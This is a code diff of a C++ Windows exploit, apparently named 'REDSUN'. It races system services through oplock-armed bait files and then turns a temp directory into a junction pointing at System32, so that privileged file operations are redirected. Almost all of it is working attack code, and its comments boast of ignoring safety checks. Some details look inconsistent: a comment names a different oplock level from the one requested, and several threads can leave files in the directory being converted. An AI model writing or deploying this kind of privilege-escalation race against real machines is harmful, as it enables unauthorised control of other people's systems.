@@ -1,111 +1,94 @@
-#define _CRT_SECURE_NO_WARNINGS
 #include <Windows.h>
-#include <cfapi.h>
 #include <winioctl.h>
 #include <iostream>
+#include <vector>
+#include <thread>
 #include <string>
-#include <memory>
 
-#pragma comment(lib, "synchronization.lib")
-#pragma comment(lib, "CldApi.lib")
+#pragma comment(lib, "ntdll.lib")
 
-// --- RAII Safety ---
-class SmartHandle {
-    HANDLE h_;
-public:
-    explicit SmartHandle(HANDLE h = INVALID_HANDLE_VALUE) : h_(h) {}
-    ~SmartHandle() { if (h_ != INVALID_HANDLE_VALUE && h_ != NULL) CloseHandle(h_); }
-    HANDLE get() const { return h_; }
-    HANDLE* ptr() { return &h_; }
-    bool isValid() const { return h_ != INVALID_HANDLE_VALUE && h_ != NULL; }
-};
+// The raw math Big Davey was scared of
+#define REPARSE_MOUNTPOINT_HEADER_SIZE 8
 
-// --- The Pivot Engine ---
-bool CreateJunction(const std::wstring& dir, const std::wstring& target) {
-    SmartHandle hDir(CreateFileW(dir.c_str(), GENERIC_WRITE,
+// Force a junction flip with zero regard for "safety protocols"
+bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
+    HANDLE hDir = CreateFileW(dir.c_str(), GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
-        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL));
+        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
 
-    if (!hDir.isValid()) return false;
+    if (hDir == INVALID_HANDLE_VALUE) return false;
 
     std::wstring ntTarget = L"\\??\\" + target;
     DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
     DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;
 
-    auto buffer = std::make_unique<BYTE[]>(bufSize);
+    auto buffer = std::unique_ptr<BYTE[]>(new BYTE[bufSize]);
     PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.get());
 
     rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
-    rdb->ReparseDataLength = (USHORT)(targetByteLen + 8 + 4);
+    rdb->ReparseDataLength = (USHORT)(targetByteLen + 12);
     rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
     rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);
 
     memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);
     DWORD bytesReturned;
-    return DeviceIoControl(hDir.get(), FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);
+    BOOL success = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);
+
+    CloseHandle(hDir);
+    return success;
 }
 
-void FullRedLaunch() {
-    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    SetConsoleTextAttribute(hOut, FOREGROUND_RED | FOREGROUND_INTENSITY);
-    std::wcout << L"[!] FULL RED ACTIVATED - OPLOCK ENGINE ONLINE" << std::endl;
+// The Threaded Trap
+void ArmTrap(int id, std::wstring workDir) {
+    std::wstring baitFile = workDir + L"\\vortex_bait_" + std::to_wstring(id) + L".tmp";
 
-    // 1. Setup Workspace
-    wchar_t tmp[MAX_PATH];
-    GetTempPathW(MAX_PATH, tmp);
-    std::wstring workDir = std::wstring(tmp) + L"Global_Exploit_Dir";
-    CreateDirectoryW(workDir.c_str(), NULL);
-
-    std::wstring baitFile = workDir + L"\\target_svc.dat";
-
-    // 2. Open Bait with Oplock-compatible flags
-    // We need FILE_FLAG_OVERLAPPED to catch the break
-    SmartHandle hBait(CreateFileW(baitFile.c_str(), GENERIC_READ | GENERIC_WRITE,
+    HANDLE hBait = CreateFileW(baitFile.c_str(), GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL));
+        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
 
-    if (!hBait.isValid()) {
-        std::wcout << L"[-] Failed to seat bait." << std::endl;
-        return;
-    }
+    if (hBait == INVALID_HANDLE_VALUE) return;
 
-    // 3. Set the Trap (Oplock)
     OVERLAPPED ov = { 0 };
     ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 
-    std::wcout << L"[*] Arming Level 2 Oplock on: " << baitFile << std::endl;
+    // Requesting the Level 1 Oplock (The Pause)
+    DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);
 
-    // This call returns immediately, but the event triggers when someone else opens the file
-    BOOL status = DeviceIoControl(hBait.get(), FSCTL_REQUEST_OPLOCK_LEVEL_1,
-                                  NULL, 0, NULL, 0, NULL, &ov);
+    // This thread hangs here until a system service bites the bait
+    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
+        printf("[!] THREAD %d: TRIGGERED! System service is frozen. Swapping...\n", id);
 
-    std::wcout << L"[*] Trap set. Waiting for System process to trigger..." << std::endl;
+        CloseHandle(hBait);
+        DeleteFileW(baitFile.c_str());
 
-    // 4. THE WAIT
-    // At this point, the program sits here.
-    // If a system service (like Indexer) tries to read this file, it HANGS.
-    WaitForSingleObject(ov.hEvent, INFINITE);
-
-    // 5. THE SWAP (THE RACE WIN)
-    std::wcout << L"[!] OPLOCK BROKEN! System is waiting. Performing Pivot..." << std::endl;
-
-    // Close the handle to the file so we can delete the directory/file
-    hBait.~SmartHandle();
-    DeleteFileW(baitFile.c_str());
-
-    // Redirect the entire directory to System32
-    if (CreateJunction(workDir, L"C:\\Windows\\System32")) {
-        std::wcout << L"[+++] PIVOT SUCCESSFUL. Workspace now points to System32." << std::endl;
-        std::wcout << L"[!] The calling service will now continue into the redirected path." << std::endl;
-    } else {
-        std::wcout << L"[-] Pivot failed at the finish line." << std::endl;
+        if (ForceJunction(workDir, L"C:\\Windows\\System32")) {
+            printf("[+++] THREAD %d: PIVOT COMPLETE. REDSUN ACTIVE.\n", id);
+            exit(0); // Exit once we win the race
+        }
     }
 
     CloseHandle(ov.hEvent);
 }
 
 int main() {
-    FullRedLaunch();
-    system("pause");
+    printf("[*] INITIALIZING REDSUN VORTEX - MULTI-THREADED RACE ENGINE\n");
+
+    wchar_t tmp[MAX_PATH];
+    GetTempPathW(MAX_PATH, tmp);
+    std::wstring workDir = std::wstring(tmp) + L"Redsun_Vortex";
+    CreateDirectoryW(workDir.c_str(), NULL);
+
+    // Launch 10 parallel threads to catch any possible service interaction
+    std::vector<std::thread> threads;
+    for (int i = 0; i < 10; i++) {
+        threads.emplace_back(ArmTrap, i, workDir);
+    }
+
+    printf("[*] 10 OPLOCKS ARMED. Waiting for system interaction...\n");
+
+    for (auto& t : threads) {
+        t.join();
+    }
+
     return 0;
 }
